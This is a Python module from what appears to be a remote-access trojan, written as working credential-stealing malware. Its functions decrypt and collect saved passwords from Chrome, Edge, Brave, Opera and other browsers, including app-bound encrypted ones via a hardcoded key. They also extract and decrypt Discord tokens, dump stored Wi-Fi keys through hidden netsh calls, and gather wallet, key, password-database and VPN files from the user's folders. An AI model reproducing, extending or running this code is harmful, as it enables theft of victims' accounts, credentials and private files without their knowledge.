import os
import random
import base64
import tempfile
import subprocess
import re
import json
import logging
import sqlite3
import shutil
from pathlib import Path
from typing import Optional, Set, List

from .config import CREATE_NO_WINDOW, _d, _LOGIN, _DISCORD

log = logging.getLogger("rat")

TOKEN_RE = re.compile(rb'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
ENC_TOKEN_RE = re.compile(rb'dQw4w9WgXcQ:[A-Za-z0-9+/=]+')

def decrypt_dpapi(encrypted: bytes) -> str:
    try:
        import win32crypt
        return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode(errors="ignore")
    except Exception:
        return ""

def get_master_key_abe(base_path: str) -> Optional[bytes]:
    try:
        import win32crypt
        from Crypto.Cipher import AES
        local_state = os.path.join(base_path, "Local State")
        if not os.path.exists(local_state):
            return None
        with open(local_state, "r", encoding="utf-8", errors="ignore") as f:
            data = json.loads(f.read())
        abe_b64 = data.get("os_crypt", {}).get("app_bound_encrypted_key")
        if not abe_b64:
            return None
        abe = base64.b64decode(abe_b64)
        if not abe.startswith(b"APPB"):
            return None
        blob = abe[4:]
        try:
            unwrapped = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
        except Exception:
            return None
        if unwrapped and unwrapped[0] == 1:
            aes_key = base64.b64decode("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
            iv = unwrapped[1:13]
            ct = unwrapped[13:45]
            tag = unwrapped[45:61]
            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt_and_verify(ct, tag)
        return unwrapped[-32:] if len(unwrapped) >= 32 else None
    except Exception as e:
        log.debug("ABE master key failed: %s", e)
        return None

def decrypt_v20(master_key: bytes, blob: bytes) -> str:
    try:
        from Crypto.Cipher import AES
        if not blob.startswith(b"v20"):
            return ""
        nonce = blob[3:15]
        ct = blob[15:-16]
        tag = blob[-16:]
        pt = AES.new(master_key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)
        return pt.decode(errors="ignore")
    except Exception:
        return ""

def steal_chromium(name: str, base_path: str) -> List[str]:
    results = []
    login_db = os.path.join(base_path, "Default", _d(_LOGIN))
    if not os.path.exists(login_db):
        return results
    abe_key = get_master_key_abe(base_path)
    tmp = os.path.join(tempfile.gettempdir(), f"t{random.randint(10000,99999)}.db")
    try:
        shutil.copy2(login_db, tmp)
        with sqlite3.connect(tmp) as conn:
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc in cur.fetchall():
                if not (user or enc):
                    continue
                pwd = ""
                if abe_key and enc and enc.startswith(b"v20"):
                    pwd = decrypt_v20(abe_key, enc)
                if not pwd and enc:
                    pwd = decrypt_dpapi(enc)
                if pwd or user:
                    results.append(f"{url} | {user} | {pwd}")
    except Exception as e:
        log.debug("steal_chromium %s: %s", name, e)
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass
    return results

def steal_all_passwords() -> str:
    local = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")
    browsers = {
        "Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(local, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(appdata, "Opera Software", "Opera Stable"),
        "OperaGX": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
        "Vivaldi": os.path.join(local, "Vivaldi", "User Data"),
        "Yandex": os.path.join(local, "Yandex", "YandexBrowser", "User Data"),
    }
    out = []
    for name, path in browsers.items():
        creds = steal_chromium(name, path)
        if creds:
            out.append(f"=== {name} ===\n" + "\n".join(creds))
    return "\n\n".join(out) if out else "empty"

def get_discord_master_key(base_path: str) -> Optional[bytes]:
    try:
        import win32crypt
        local_state = os.path.join(base_path, "Local State")
        if not os.path.exists(local_state):
            return None
        with open(local_state, "r", encoding="utf-8", errors="ignore") as f:
            data = json.loads(f.read())
        enc_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        enc_key = enc_key[5:]
        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    except Exception as e:
        log.debug("master_key %s: %s", base_path, e)
        return None

def decrypt_discord_token(enc_token: bytes, master_key: bytes) -> Optional[str]:
    try:
        from Crypto.Cipher import AES
        if enc_token.startswith(b"dQw4w9WgXcQ:"):
            enc_token = enc_token[12:]
        enc_token = base64.b64decode(enc_token)
        nonce = enc_token[3:15]
        ciphertext = enc_token[15:-16]
        tag = enc_token[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode(errors="ignore")
    except Exception:
        return None

def _extract_tokens_from_ldb(ldb_path: str, master: Optional[bytes], tokens: Set[str]) -> None:
    if not os.path.isdir(ldb_path):
        return
    for fname in os.listdir(ldb_path):
        if not fname.endswith((".ldb", ".log")):
            continue
        try:
            with open(os.path.join(ldb_path, fname), "rb") as fh:
                data = fh.read()
            for m in TOKEN_RE.findall(data):
                tokens.add(m.decode(errors="ignore"))
            if master:
                for m in ENC_TOKEN_RE.findall(data):
                    dec = decrypt_discord_token(m, master)
                    if dec and TOKEN_RE.match(dec.encode()):
                        tokens.add(dec)
        except Exception as e:
            log.debug("ldb read %s: %s", fname, e)

def steal_discord_tokens() -> str:
    base = os.environ.get("APPDATA", "")
    local = os.environ.get("LOCALAPPDATA", "")
    discords = [
        os.path.join(base, _d(_DISCORD)),
        os.path.join(base, "discordcanary"),
        os.path.join(base, "discordptb"),
        os.path.join(base, "discorddevelopment"),
    ]
    browsers = [
        os.path.join(local, "Google", "Chrome", "User Data"),
        os.path.join(local, "Microsoft", "Edge", "User Data"),
        os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
        os.path.join(local, "Vivaldi", "User Data"),
        os.path.join(base, "Opera Software", "Opera Stable"),
        os.path.join(base, "Opera Software", "Opera GX Stable"),
        os.path.join(local, "Yandex", "YandexBrowser", "User Data"),
    ]
    tokens: Set[str] = set()
    for dpath in discords:
        if os.path.isdir(dpath):
            master = get_discord_master_key(dpath)
            _extract_tokens_from_ldb(os.path.join(dpath, "Local Storage", "leveldb"), master, tokens)
    for bpath in browsers:
        master = get_discord_master_key(bpath)
        _extract_tokens_from_ldb(os.path.join(bpath, "Default", "Local Storage", "leveldb"), master, tokens)
    return "\n".join(sorted(tokens)) if tokens else "empty"

def steal_wifi() -> str:
    try:
        out = subprocess.check_output("netsh wlan show profiles", shell=True, creationflags=CREATE_NO_WINDOW).decode(errors="ignore")
        res = []
        for line in out.splitlines():
            if "All User Profile" in line:
                name = line.split(":")[-1].strip()
                try:
                    det = subprocess.check_output(f'netsh wlan show profile name="{name}" key=clear', shell=True, creationflags=CREATE_NO_WINDOW).decode(errors="ignore")
                    for l in det.splitlines():
                        if "Key Content" in l:
                            res.append(f"{name} : {l.split(':')[-1].strip()}")
                except Exception:
                    continue
        return "\n".join(res) if res else "empty"
    except Exception as e:
        return str(e)

def grab_interesting_files() -> List[str]:
    exts = {".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".csv", ".wallet", ".key", ".kdbx", ".rdp", ".json", ".pem", ".ppk", ".ovpn"}
    targets = [Path.home() / "Desktop", Path.home() / "Documents", Path.home() / "Downloads"]
    found = []
    for folder in targets:
        if not folder.exists():
            continue
        for f in folder.rglob("*"):
            if f.is_file() and f.suffix.lower() in exts and 50 < f.stat().st_size < 20_000_000:
                found.append(str(f))
                if len(found) >= 40:
                    return found
    return found
